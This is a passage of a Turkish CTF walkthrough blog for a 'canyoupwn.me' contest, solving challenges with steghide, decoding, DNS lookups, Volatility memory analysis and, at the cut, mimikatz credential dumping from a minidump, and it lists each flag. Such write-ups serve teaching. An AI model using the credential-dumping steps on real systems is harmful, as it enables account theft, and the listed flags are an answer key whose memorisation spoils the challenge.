-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-rXIW3-zw0Lo/WSo014z0b8I/AAAAAAAAAds/PMSHe5aVitA_qxO3VxGPmCbLe6efPUb6ACLcB/s1600/Screenshot_31.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;430&quot; data-original-width=&quot;1238&quot; height=&quot;111&quot; src=&quot;https://1.bp.blogspot.com/-rXIW3-zw0Lo/WSo014z0b8I/AAAAAAAAAds/PMSHe5aVitA_qxO3VxGPmCbLe6efPUb6ACLcB/s320/Screenshot_31.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Ve işte flag karşımızda.&lt;br /&gt;
-&lt;br /&gt;
-8.Sorumuz’un cevabı : cypwn_{kks271723jjjasd9asd771239}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-FX_YMj9UW5k/WSo1EQe-m0I/AAAAAAAAAdw/5BhgTT3YIjYHd5ujby8KlMqeL1cFk2tKgCLcB/s1600/Screenshot_32.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;537&quot; data-original-width=&quot;599&quot; height=&quot;286&quot; src=&quot;https://3.bp.blogspot.com/-FX_YMj9UW5k/WSo1EQe-m0I/AAAAAAAAAdw/5BhgTT3YIjYHd5ujby8KlMqeL1cFk2tKgCLcB/s320/Screenshot_32.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-9.Sorumuz’a geçelim : xCyberx&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz uzun olduğu için buraya yazmıyorum resimden bakabilirsiniz.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-BX7XPnEJ_p8/WSo1i4aYf8I/AAAAAAAAAd0/moOIbSweBaMW0jFi-OdpMsM1Nr2wf64GgCLcB/s1600/Screenshot_33.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;661&quot; data-original-width=&quot;590&quot; height=&quot;320&quot; src=&quot;https://4.bp.blogspot.com/-BX7XPnEJ_p8/WSo1i4aYf8I/AAAAAAAAAd0/moOIbSweBaMW0jFi-OdpMsM1Nr2wf64GgCLcB/s320/Screenshot_33.png&quot; width=&quot;285&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bu soruda biraz zorlandım bir kaç pdf okumak zorunda bile kaldım :D&lt;br /&gt;
-&lt;br /&gt;
-sonunda bir ctf’te uygulanan “steghide” tekniğine baktım uzun araştırmalar sonucu.&lt;br /&gt;
-&lt;br /&gt;
-ctf’te resim dosyasının içinden dosya çıkartabiliyorlardı ama bizim dosyamızda biraz farklı oldu çıkarttığımız dosya bizden bir şifre istedi.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-fbM8uGZFmtk/WSo3OU0lWxI/AAAAAAAAAeA/jXTz-KauMWM6JSmUXwziCsiquR2ryReAACLcB/s1600/Screenshot_34.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;187&quot; data-original-width=&quot;823&quot; height=&quot;72&quot; src=&quot;https://4.bp.blogspot.com/-fbM8uGZFmtk/WSo3OU0lWxI/AAAAAAAAAeA/jXTz-KauMWM6JSmUXwziCsiquR2ryReAACLcB/s320/Screenshot_34.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Şifre olarak soru başlığımız olabileceğini düşündüm ve “xcyberx” olarak girdim şifreyi ama başarısız oldum.Farklı kombinasyonlar denerken “xcyberx” ile ilgili şifrenin “cyberx” olduğunu buldum ve resim dosyamızı “steghide” ile açtıktan sonra içinden “hint.txt” diye bir dosya çıktı ve onun içindende bir “yandex dosya” url’si çıktı.&lt;br /&gt;
-&lt;br /&gt;
-Bu urlye gittiğimizde içinden bir “QR CODE” gördük ve yine decoder’imize sarıldık.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-7MQBwgJi6YU/WSo4CFqWA_I/AAAAAAAAAeI/VjQoFnMTTb8HpBmIUaSsuFRA2lmDTHg2QCLcB/s1600/Screenshot_35.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;695&quot; data-original-width=&quot;1207&quot; height=&quot;184&quot; src=&quot;https://2.bp.blogspot.com/-7MQBwgJi6YU/WSo4CFqWA_I/AAAAAAAAAeI/VjQoFnMTTb8HpBmIUaSsuFRA2lmDTHg2QCLcB/s320/Screenshot_35.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-Bu “QR CODE”u decode ettiğimizde karşımıza böyle birşey geldi.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-Fj_S6IqcOF0/WSo4UHglOdI/AAAAAAAAAeM/DYEacm3XT6ky46SaZ8K2pdpH3yJyTSQXwCLcB/s1600/Screenshot_36.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;697&quot; data-original-width=&quot;1243&quot; height=&quot;179&quot; src=&quot;https://4.bp.blogspot.com/-Fj_S6IqcOF0/WSo4UHglOdI/AAAAAAAAAeM/DYEacm3XT6ky46SaZ8K2pdpH3yJyTSQXwCLcB/s320/Screenshot_36.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;İşaretlediğim yerlerdeki hashlere baktığınızda base64 olduğunu görebilirsiniz bunu base64decoder ile decode ettiğimizde.Karşımıza böyle bir hash geliyor.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-zgPjUscp_Uo/WSo4pNKwInI/AAAAAAAAAeQ/XhoXoGfwL6EUMBctS9xNoHldznD0bH5yQCEw/s1600/Screenshot_37.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;659&quot; data-original-width=&quot;1213&quot; height=&quot;173&quot; src=&quot;https://4.bp.blogspot.com/-zgPjUscp_Uo/WSo4pNKwInI/AAAAAAAAAeQ/XhoXoGfwL6EUMBctS9xNoHldznD0bH5yQCEw/s320/Screenshot_37.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bunun bir “ROT” olduğunu kolaylıkla anladık tabi hemen “ROT DECODER”imize sarılıp.Karşımıza bu karmaşık yazıları dizdik.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-cHXWYL2pGt8/WSo5M-rtEsI/AAAAAAAAAeY/IDFclyNE3ywOtFIF2dRpR0sybsQxTMrNACLcB/s1600/Screenshot_38.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;541&quot; data-original-width=&quot;638&quot; height=&quot;271&quot; src=&quot;https://4.bp.blogspot.com/-cHXWYL2pGt8/WSo5M-rtEsI/AAAAAAAAAeY/IDFclyNE3ywOtFIF2dRpR0sybsQxTMrNACLcB/s320/Screenshot_38.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;Değerler flag’e benzediği için bizim flag başlangıç türümüzü “CTRL + F” ile aradım “cypwn_{}”.&lt;br /&gt;
-&lt;br /&gt;
-Ve flagimizi bu şekilde bulduk.&lt;br /&gt;
-&lt;br /&gt;
-9.Sorumuz’un cevabı : cypwn_{g00d_j0B_Br0&lt;em&gt;y0u&lt;/em&gt;@r3_@_h@ck3R}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-2o3lwE7bcdg/WSo5vPEnfxI/AAAAAAAAAeg/7Ch5prDQQqMzY2jR2v2hRmYmXff0vOB0gCLcB/s1600/Screenshot_39.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;657&quot; data-original-width=&quot;599&quot; height=&quot;320&quot; src=&quot;https://1.bp.blogspot.com/-2o3lwE7bcdg/WSo5vPEnfxI/AAAAAAAAAeg/7Ch5prDQQqMzY2jR2v2hRmYmXff0vOB0gCLcB/s320/Screenshot_39.png&quot; width=&quot;291&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-10.Sorumuz’a geçelim : Mail&lt;br /&gt;
-&lt;br /&gt;
-İpucu : Bu canyoupwn.me mailleri nerede barındırıyor acaba?&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-Ka-p9wQqP2E/WSrrylORZ0I/AAAAAAAAAew/0RPsO3CT4vsfsrgiDTra8KUkevpDtOgcQCLcB/s1600/Screenshot_1.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;500&quot; data-original-width=&quot;598&quot; height=&quot;267&quot; src=&quot;https://2.bp.blogspot.com/-Ka-p9wQqP2E/WSrrylORZ0I/AAAAAAAAAew/0RPsO3CT4vsfsrgiDTra8KUkevpDtOgcQCLcB/s320/Screenshot_1.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;Bu soruyu görünce aklımıza “dig” gelmiyor değil online bir web sitedende yapabiliriz ama biz “dig” ile ilerleyelim.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-ybId_GwS3yk/WSrsVl5VO_I/AAAAAAAAAe4/3BMCPiRS1Kc4C60jdvodgRB4rHejOtOWgCLcB/s1600/Screenshot_2.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;388&quot; data-original-width=&quot;684&quot; height=&quot;181&quot; src=&quot;https://2.bp.blogspot.com/-ybId_GwS3yk/WSrsVl5VO_I/AAAAAAAAAe4/3BMCPiRS1Kc4C60jdvodgRB4rHejOtOWgCLcB/s320/Screenshot_2.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-“dig” ile mx taraması yaptığımız’da mail server olarak karşımıza “mx.yandex.net” çıkıyor.Bu olabilirmi diye deniyoruz cevabımızı ve bu soruyuda böylelikle geçmiş oluyoruz.&lt;br /&gt;
-&lt;br /&gt;
-10.Sorumuz’un cevabı : cypwn_{mx.yandex.net}&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-ZaWbX7OMlbc/WSrsoxVy-sI/AAAAAAAAAe8/L4Q1W82lwp0eqmCpqHqAvprWE_bYVgR5ACLcB/s1600/Screenshot_3.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;556&quot; data-original-width=&quot;597&quot; height=&quot;298&quot; src=&quot;https://1.bp.blogspot.com/-ZaWbX7OMlbc/WSrsoxVy-sI/AAAAAAAAAe8/L4Q1W82lwp0eqmCpqHqAvprWE_bYVgR5ACLcB/s320/Screenshot_3.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-11.Sorumuz’a geçelim : NS&lt;br /&gt;
-&lt;br /&gt;
-İpucu : canyoupwn.me ‘nin nameserverlarından birisi?&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz açık açık belirtti ne istediğini bizede online veya toollardan birini kullanarak çıkan nameserverleri denemek düşüyor.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-McC_DDf5Gjg/WSrtdtkA9TI/AAAAAAAAAfE/DqE321j3p0gSY_VMDEQSZbW10GzQH2GTwCLcB/s1600/Screenshot_4.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;354&quot; data-original-width=&quot;540&quot; height=&quot;209&quot; src=&quot;https://4.bp.blogspot.com/-McC_DDf5Gjg/WSrtdtkA9TI/AAAAAAAAAfE/DqE321j3p0gSY_VMDEQSZbW10GzQH2GTwCLcB/s320/Screenshot_4.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Online herhangi bir nameserver checker’den bu işlemi yapınca 2 tane “cloudflare” nameserver’i geliyor 1.’si flagimizin cevabı çıktı.&lt;br /&gt;
-&lt;br /&gt;
-11.Sorumuz’un cevabı : cypwn_{ada.ns.cloudflare.com}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-j8VIKWJUEXo/WSrt-BvEwLI/AAAAAAAAAfM/TZX2RdkRAM4nSQH-W2LVM14rzgQwWQBygCLcB/s1600/Screenshot_5.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;561&quot; data-original-width=&quot;599&quot; height=&quot;299&quot; src=&quot;https://3.bp.blogspot.com/-j8VIKWJUEXo/WSrt-BvEwLI/AAAAAAAAAfM/TZX2RdkRAM4nSQH-W2LVM14rzgQwWQBygCLcB/s320/Screenshot_5.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-12.Sorumuz’a geçelim : Cyrpto Die&lt;br /&gt;
-&lt;br /&gt;
-İpucumu : Rardaki dosyayı açarak dosyayı incelememize yardımcı olmalısın.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-6imJePb-0fI/WSruNY_bzYI/AAAAAAAAAfQ/tIACFRumUaoERlLtVx5NDCZwvrvh1YzQgCLcB/s1600/Screenshot_6.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;539&quot; data-original-width=&quot;601&quot; height=&quot;286&quot; src=&quot;https://2.bp.blogspot.com/-6imJePb-0fI/WSruNY_bzYI/AAAAAAAAAfQ/tIACFRumUaoERlLtVx5NDCZwvrvh1YzQgCLcB/s320/Screenshot_6.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bu soru biraz değişik geçti benim için.&lt;br /&gt;
-&lt;br /&gt;
-Sorumuz’un açıklamasında verilen link’ten bir “ctf_canyoupwnme.rar” dosyası indiriyoruz.&lt;br /&gt;
-bu dosya’yı açtığımız’da içinden “canyoupwnme.rar” ve bir “password.txt” dosyası çıkıyordu.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-5IhgO1CSoB8/WSrvG18FSQI/AAAAAAAAAfY/L6O79EjwWyskdkUxzU6RBr_Bk0MicLQpgCLcB/s1600/Screenshot_7.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;296&quot; data-original-width=&quot;717&quot; height=&quot;132&quot; src=&quot;https://1.bp.blogspot.com/-5IhgO1CSoB8/WSrvG18FSQI/AAAAAAAAAfY/L6O79EjwWyskdkUxzU6RBr_Bk0MicLQpgCLcB/s320/Screenshot_7.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;br /&gt;&lt;/div&gt;
-&lt;p&gt;Hash’imiz “MD5” çıkıyor online bir “MD5 Decrypter” ile bu hash’i çözdüğümüzde karşımıza “&lt;b style=&quot;background-color: #0e0e0e; color: limegreen; font-family: Abel, sans-serif; font-size: 18px; text-align: center;&quot;&gt;eHh4eHh4&lt;/b&gt;” isimli bir yazı geliyor.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-wDOr5sebUTM/WSrvt6dU7TI/AAAAAAAAAfg/vJ_iN9b1w2YSd9nR5epxHO7kDo7m7gYOACLcB/s1600/Screenshot_8.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;646&quot; data-original-width=&quot;1338&quot; height=&quot;154&quot; src=&quot;https://3.bp.blogspot.com/-wDOr5sebUTM/WSrvt6dU7TI/AAAAAAAAAfg/vJ_iN9b1w2YSd9nR5epxHO7kDo7m7gYOACLcB/s320/Screenshot_8.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bu çıkan sonuçtaki yazı base64 çıkıyor ve bu base64 hash’ini online bir web sitede decode ettiğimizde karşımıza “xxxxxx” isimli bir yazı geliyor.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-iih8hFUPluE/WSrwF3yU9zI/AAAAAAAAAfk/_vOScyAix88UOx-QpicR7rpEgH5udtqOACLcB/s1600/Screenshot_9.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;542&quot; data-original-width=&quot;1031&quot; height=&quot;168&quot; src=&quot;https://1.bp.blogspot.com/-iih8hFUPluE/WSrwF3yU9zI/AAAAAAAAAfk/_vOScyAix88UOx-QpicR7rpEgH5udtqOACLcB/s320/Screenshot_9.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Aceba bu “password.txt”den önce gelen rar’ın şifresi olabilirmi diye bir deniyoruz.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-ikQo1Szad9s/WSrwbm6LjOI/AAAAAAAAAfo/gS7Xzda51-shHvDBnetrBgtlgNN-JW3pwCLcB/s1600/Screenshot_10.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;290&quot; data-original-width=&quot;914&quot; height=&quot;101&quot; src=&quot;https://3.bp.blogspot.com/-ikQo1Szad9s/WSrwbm6LjOI/AAAAAAAAAfo/gS7Xzda51-shHvDBnetrBgtlgNN-JW3pwCLcB/s320/Screenshot_10.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Veee flag karşımızda.&lt;br /&gt;
-&lt;br /&gt;
-12.Sorumuz’un cevabı : cypwn_{ctf_akiyo_mansallah}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-eddJ3KH72fI/WSrwrpqS9QI/AAAAAAAAAfs/9tfM6TJqJhwapV2qLHxltl6eABtIViHhwCLcB/s1600/Screenshot_11.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;599&quot; data-original-width=&quot;598&quot; height=&quot;320&quot; src=&quot;https://4.bp.blogspot.com/-eddJ3KH72fI/WSrwrpqS9QI/AAAAAAAAAfs/9tfM6TJqJhwapV2qLHxltl6eABtIViHhwCLcB/s320/Screenshot_11.png&quot; width=&quot;319&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-13.Sorumuz’a geçelim : Memory Dump&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz : Ram Imajından flag ı çıkart.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-shj3-wkrsIg/WSr0aQW_cPI/AAAAAAAAAf4/Lv4nyXQ9fF0NFgsoyRGcLyMvW__A548LgCLcB/s1600/Screenshot_12.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;538&quot; data-original-width=&quot;596&quot; height=&quot;288&quot; src=&quot;https://3.bp.blogspot.com/-shj3-wkrsIg/WSr0aQW_cPI/AAAAAAAAAf4/Lv4nyXQ9fF0NFgsoyRGcLyMvW__A548LgCLcB/s320/Screenshot_12.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Sorun’un ipucundanda bize gelen “rar” dosyasının bir ram imajı olduğunu açık açık belirtiyor herhangi bir ram imaj analizi yapan bir tool ile bu işi kolayca halledebiliriz.Ben “volatility” kullanıyorum bunu çözmek için.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-gVTI6dip_RE/WSr126xfJYI/AAAAAAAAAgE/pWDYrQuY-fM9y2Mboh8dVFzsnXl6xdk5gCLcB/s1600/Screenshot_13.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;335&quot; data-original-width=&quot;744&quot; height=&quot;143&quot; src=&quot;https://2.bp.blogspot.com/-gVTI6dip_RE/WSr126xfJYI/AAAAAAAAAgE/pWDYrQuY-fM9y2Mboh8dVFzsnXl6xdk5gCLcB/s320/Screenshot_13.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Unrar ile rar dosyamızın içinden çıkardığımız “canyoupwnme.mem” dosyasını resimde gördüğünüz parametreler ile açtığımızda karşımıza “FLG : Y3lwd25fe21lbW9fZmxhZ19idWx1bmR1fQ==” isimli base64lü bir hash geliyor.Online bir web sitede decode ettiğimizde flage ulaşıyoruz.&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-13.Sorumuz’un cevabı : cypwn_{memo_flag_bulundu}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-8awrU85wFpw/WSr2ZJyU8BI/AAAAAAAAAgM/VWW9zl_5n3kdPTGAKmdoK6PZd_kSayNrQCLcB/s1600/Screenshot_14.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;597&quot; data-original-width=&quot;594&quot; height=&quot;320&quot; src=&quot;https://4.bp.blogspot.com/-8awrU85wFpw/WSr2ZJyU8BI/AAAAAAAAAgM/VWW9zl_5n3kdPTGAKmdoK6PZd_kSayNrQCLcB/s320/Screenshot_14.png&quot; width=&quot;318&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-14.Sorumuz’a geçelim : L-P&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz : Parolayı bul&lt;br /&gt;
-&lt;br /&gt;
-Bu soru benim için biraz karmaşık oldu.Öncelikle verilen “rar” linkinden dosyamızı indiriyoruz.&lt;br /&gt;
-&lt;br /&gt;
-Herzamanki gibi “unrar e findpassword.rar” yazarak dosyamızı açıyoruz.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-jkvW6qyaiw0/WSr9GinzffI/AAAAAAAAAgc/nz9esSBhZj4-k8J3IIz0-r7BJoAddByLACLcB/s1600/Screenshot_2.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;307&quot; data-original-width=&quot;795&quot; height=&quot;123&quot; src=&quot;https://1.bp.blogspot.com/-jkvW6qyaiw0/WSr9GinzffI/AAAAAAAAAgc/nz9esSBhZj4-k8J3IIz0-r7BJoAddByLACLcB/s320/Screenshot_2.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-İndirdikten sonra “file” komutumuz ile dosyamızın ne olduğunu inceliyoruz ve bize “MİNİDUMP Crash Report Data” olduğunu söylüyor.Daha önceden “mimikatz” kullanan varsa aranızda anlamıştır olayı zaten :D&lt;br /&gt;
-&lt;br /&gt;
-Windows için “mimikatz” indirmek için : https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20170508&lt;br /&gt;
-&lt;br /&gt;
-“findpassword” dosyamızı mimikatz’ın içine atıyoruz.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-RfkL0vnoCrA/WSr91DJURxI/AAAAAAAAAgk/igjEhwiLRxMcl8AXElNirheZ_lPvOwFlgCLcB/s1600/Screenshot_3.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;385&quot; data-original-width=&quot;644&quot; height=&quot;191&quot; src=&quot;https://1.bp.blogspot.com/-RfkL0vnoCrA/WSr91DJURxI/AAAAAAAAAgk/igjEhwiLRxMcl8AXElNirheZ_lPvOwFlgCLcB/s320/Screenshot_3.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;Attıktan sonra mimikatz’ı çalıştırıp “findpassword” dosyamızı seçip tüm password’leri dump etmesini şu parametreler ile sağlıyoruz :&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
